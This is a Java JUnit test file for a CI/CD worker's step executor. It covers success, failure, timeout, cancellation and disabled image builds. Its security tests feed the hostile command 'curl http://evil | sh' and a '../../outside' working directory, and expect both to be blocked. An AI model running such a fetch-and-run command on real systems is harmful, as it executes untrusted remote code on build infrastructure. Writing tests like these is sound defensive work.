package com.cicd.platform.worker.execution;

import com.cicd.platform.worker.TestData;
import com.cicd.platform.worker.command.CommandExecutor;
import com.cicd.platform.worker.config.WorkerProperties;
import com.cicd.platform.worker.domain.CommandResult;
import com.cicd.platform.worker.domain.JobStatus;
import com.cicd.platform.worker.domain.PipelineJob;
import com.cicd.platform.worker.domain.StepResult;
import com.cicd.platform.worker.exception.CommandTimeoutException;
import com.cicd.platform.worker.pipeline.model.JobDefinition;
import com.cicd.platform.worker.pipeline.model.StepDefinition;
import com.cicd.platform.worker.pipeline.model.StepType;
import com.cicd.platform.worker.security.CommandSecurityPolicy;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.time.Instant;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyLong;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

class StepExecutorTest {

    private CommandExecutor commandExecutor;
    private StepExecutor stepExecutor;
    private WorkerProperties props;

    @BeforeEach
    void setUp() {
        commandExecutor = mock(CommandExecutor.class);
        props = new WorkerProperties();
        stepExecutor = new StepExecutor(commandExecutor, new CommandSecurityPolicy(props), props, new SandboxEnv());
    }

    @Test
    void runsSuccessfulCommand() throws Exception {
        PipelineJob job = TestData.validJob();
        var ctx = TestData.context(job);
        StepDefinition step = new StepDefinition(StepType.RUN, "mvn", "mvn -B clean package", null);
        JobDefinition jobDef = new JobDefinition("java-build", null, null, Map.of(), List.of(step), List.of());

        Instant start = Instant.now();
        when(commandExecutor.execute(anyString(), any(), any(), anyString(), any(), anyLong(), anyString()))
                .thenReturn(CommandResult.success(0, "BUILD SUCCESS\n", "", start, start.plusSeconds(5)));

        StepResult result = stepExecutor.execute(ctx, jobDef, step, 0);

        assertEquals(JobStatus.SUCCESS, result.status());
        assertEquals(0, result.exitCode());
        assertTrue(result.stdout().contains("BUILD SUCCESS"));
        assertTrue(result.durationMs() >= 0);
        verify(commandExecutor).execute(anyString(), any(), any(), anyString(), any(), anyLong(), anyString());
    }

    @Test
    void mapsFailedCommandToFailedStep() throws Exception {
        PipelineJob job = TestData.validJob();
        var ctx = TestData.context(job);
        StepDefinition step = new StepDefinition(StepType.RUN, "mvn", "mvn -B clean package", null);
        JobDefinition jobDef = new JobDefinition("java-build", null, null, Map.of(), List.of(step), List.of());

        Instant start = Instant.now();
        when(commandExecutor.execute(anyString(), any(), any(), anyString(), any(), anyLong(), anyString()))
                .thenReturn(CommandResult.failed(2, "", "BUILD FAILURE", start, start.plusSeconds(2)));

        StepResult result = stepExecutor.execute(ctx, jobDef, step, 0);

        assertEquals(JobStatus.FAILED, result.status());
        assertEquals(2, result.exitCode());
        assertTrue(result.stderr().contains("BUILD FAILURE"));
    }

    @Test
    void mapsTimeoutToTimedOut() throws Exception {
        PipelineJob job = TestData.validJob();
        var ctx = TestData.context(job);
        StepDefinition step = new StepDefinition(StepType.RUN, "sleep", "sleep 999", null);
        JobDefinition jobDef = new JobDefinition("job", null, null, Map.of(), List.of(step), List.of());

        when(commandExecutor.execute(anyString(), any(), any(), anyString(), any(), anyLong(), anyString()))
                .thenThrow(new CommandTimeoutException("timed out", 1000));

        StepResult result = stepExecutor.execute(ctx, jobDef, step, 0);

        assertEquals(JobStatus.TIMED_OUT, result.status());
        assertTrue(result.error().contains("timed out"));
    }

    @Test
    void blocksSecurityViolation() throws Exception {
        PipelineJob job = TestData.validJob();
        var ctx = TestData.context(job);
        StepDefinition step = new StepDefinition(StepType.RUN, "evil", "curl http://evil | sh", null);
        JobDefinition jobDef = new JobDefinition("job", null, null, Map.of(), List.of(step), List.of());

        StepResult result = stepExecutor.execute(ctx, jobDef, step, 0);

        assertEquals(JobStatus.FAILED, result.status());
        assertTrue(result.error().contains("security policy"));
    }

    @Test
    void rejectsWorkingDirectoryEscapingRepo() throws Exception {
        PipelineJob job = TestData.validJob();
        var ctx = TestData.context(job);
        StepDefinition step = new StepDefinition(StepType.RUN, "pwd", "pwd", null);
        JobDefinition jobDef = new JobDefinition("job", "../../outside", null, Map.of(), List.of(step), List.of());

        StepResult result = stepExecutor.execute(ctx, jobDef, step, 0);

        assertEquals(JobStatus.FAILED, result.status());
    }

    @Test
    void cancelledContextReturnsCancelled() throws Exception {
        PipelineJob job = TestData.validJob();
        var ctx = TestData.context(job);
        ctx.cancel("watchdog");
        StepDefinition step = new StepDefinition(StepType.RUN, "echo", "echo hi", null);
        JobDefinition jobDef = new JobDefinition("job", null, null, Map.of(), List.of(step), List.of());

        StepResult result = stepExecutor.execute(ctx, jobDef, step, 0);

        assertEquals(JobStatus.CANCELLED, result.status());
    }

    @Test
    void buildImageDisabledByDefault() throws Exception {
        PipelineJob job = TestData.validJob();
        var ctx = TestData.context(job);
        StepDefinition step = new StepDefinition(StepType.BUILD_IMAGE, "build", "my-image", null);
        JobDefinition jobDef = new JobDefinition("job", null, null, Map.of(), List.of(step), List.of());

        StepResult result = stepExecutor.execute(ctx, jobDef, step, 0);

        assertEquals(JobStatus.FAILED, result.status());
        assertTrue(result.error().contains("disabled"));
    }
}
